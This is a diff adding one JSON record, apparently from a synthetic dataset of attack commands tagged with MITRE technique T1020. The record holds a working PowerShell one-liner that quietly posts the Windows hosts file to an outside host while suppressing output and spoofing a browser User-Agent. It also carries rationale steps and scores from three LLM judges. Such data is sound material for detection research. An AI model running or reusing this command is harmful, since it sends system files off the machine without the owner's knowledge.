@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://edge.examplecdn.com/submit/hosts' -Method Post -InFile 'C:\\Windows\\System32\\drivers\\etc\\hosts' -ContentType 'text/plain' -Headers @{ 'User-Agent'='Mozilla/5.0' } -ErrorAction SilentlyContinue",
+  "explanation": "Silently exfiltrates the hosts file via HTTPS POST to reveal potential redirections or tampering.",
+  "rationale_steps": [
+    "Select a small but sensitive configuration file.",
+    "Exfiltrate the file using Invoke-WebRequest POST over HTTPS.",
+    "Keep headers generic and suppress progress output."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-a38a809b",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell one-liner is well-formed with balanced quotes/braces, valid parameters, a proper semicolon separator, and a correct header hashtable.",
+        "semantic_score": 4,
+        "semantic_justification": "It exfiltrates the hosts file via HTTPS POST with progress/errors suppressed, aligning with automated exfiltration, though it lacks scheduling/batching and may still emit a response object.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T04:22:06.812873Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable assignment, cmdlet usage, parameter flags, balanced quotes, and a properly formatted hashtable for headers.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1020 (Automated Exfiltration) as it silently exfiltrates the hosts file via HTTPS POST to an external server with error suppression, user-agent spoofing, and progress preference silencing to avoid detection.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T04:22:09.886485Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct Powershell syntax, balanced quotes, valid parameters, and proper variable assignment.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly achieves the claimed intent of silently exfiltrating the hosts file via HTTPS POST, directly aligning with the T1020 Automated Exfiltration technique using appropriate tools and parameters.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T06:03:05.018059Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
